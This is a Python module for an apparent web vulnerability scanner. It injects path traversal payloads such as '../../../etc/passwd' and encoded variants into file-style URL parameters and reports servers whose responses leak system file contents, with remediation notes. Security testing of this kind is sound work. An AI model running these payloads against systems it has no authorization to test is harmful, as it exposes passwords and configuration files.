import os
import requests
from urllib.parse import quote, urlparse
from colorama import Fore, Style, init

init(autoreset=True)


class PathTraversalAgent:
    def __init__(self, target_url, session=None):
        self.target = target_url
        self.session = session or requests.Session()
        self.session.headers.update({
            'User-Agent': (
                'SecurityAudit/1.0 (Authorized Assessment)'
            )
        })
        self.findings = []
        self.payloads = self._load_payloads()

    def _load_payloads(self):
        payload_file = os.path.join(
            'payloads', 'path_traversal_payloads.txt'
        )
        try:
            with open(payload_file, 'r') as f:
                return [
                    line.strip()
                    for line in f.readlines()
                    if line.strip()
                    and not line.startswith('#')
                ]
        except FileNotFoundError:
            return [
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
            ]

    def _build_test_url(self, parsed, params):
        query = '&'.join(
            f'{k}={quote(str(v), safe="")}'
            for k, v in params.items()
        )
        return (
            f"{parsed.scheme}://{parsed.netloc}"
            f"{parsed.path}?{query}"
        )

    def detect_path_traversal(self, url):
        print(
            f"  {Fore.CYAN}[*] Testing path "
            f"traversal...{Style.RESET_ALL}"
        )

        linux_indicators = [
            'root:x:', 'root:*:', 'daemon:',
            '/bin/bash', '/bin/sh',
            '/usr/sbin/nologin'
        ]
        windows_indicators = [
            '# Copyright (c) 1993-2009',
            '127.0.0.1',
            '# This is a sample HOSTS file'
        ]

        file_params = [
            'file', 'path', 'page', 'doc',
            'document', 'folder', 'pg', 'style',
            'template', 'include', 'view',
            'content', 'lang', 'name'
        ]

        parsed = urlparse(url)

        if parsed.query:
            params = {}
            for param in parsed.query.split('&'):
                if '=' in param:
                    k, v = param.split('=', 1)
                    params[k] = v
        else:
            params = {
                p: 'test.txt'
                for p in file_params[:5]
            }

        for param_name in list(params.keys())[:3]:
            for payload in self.payloads[:8]:
                test_params = params.copy()
                test_params[param_name] = payload
                test_url = self._build_test_url(
                    parsed, test_params
                )
                try:
                    r = self.session.get(
                        test_url, timeout=10
                    )
                    response_text = r.text

                    all_indicators = (
                        linux_indicators
                        + windows_indicators
                    )
                    for indicator in all_indicators:
                        if indicator in response_text:
                            os_type = (
                                'Linux/Unix'
                                if indicator
                                in linux_indicators
                                else 'Windows'
                            )
                            self.findings.append({
                                'type': 'Path Traversal',
                                'category': (
                                    'path_traversal'
                                ),
                                'risk': 'CRITICAL',
                                'url': test_url,
                                'parameter': param_name,
                                'payload': payload,
                                'os_type': os_type,
                                'indicator': indicator,
                                'description': (
                                    f'Path traversal in '
                                    f'"{param_name}". '
                                    f'System files readable.'
                                ),
                                'business_impact': (
                                    'Attacker reads sensitive '
                                    'files, configs, passwords'
                                ),
                                'fix': (
                                    '1. Use allowlist for paths\n'
                                    '2. Validate canonical path\n'
                                    '3. Never use input in '
                                    'file operations\n'
                                    '4. Use chroot jail'
                                ),
                                'cvss_score': 9.1,
                                'cwe': 'CWE-22'
                            })
                            print(
                                f"  {Fore.RED}[!!!] PATH "
                                f"TRAVERSAL in: {param_name}"
                                f"{Style.RESET_ALL}"
                            )
                            break
                except Exception:
                    pass

        return self.findings

    def run_full_scan(self, urls_to_test=None):
        print(
            f"\n{Fore.YELLOW}[PATH TRAVERSAL AGENT] "
            f"Starting...{Style.RESET_ALL}"
        )
        test_urls = urls_to_test or [self.target]
        for url in test_urls:
            self.detect_path_traversal(url)
        print(
            f"{Fore.GREEN}[PATH TRAVERSAL AGENT] "
            f"Complete - {len(self.findings)} findings"
            f"{Style.RESET_ALL}"
        )
        return self.findings
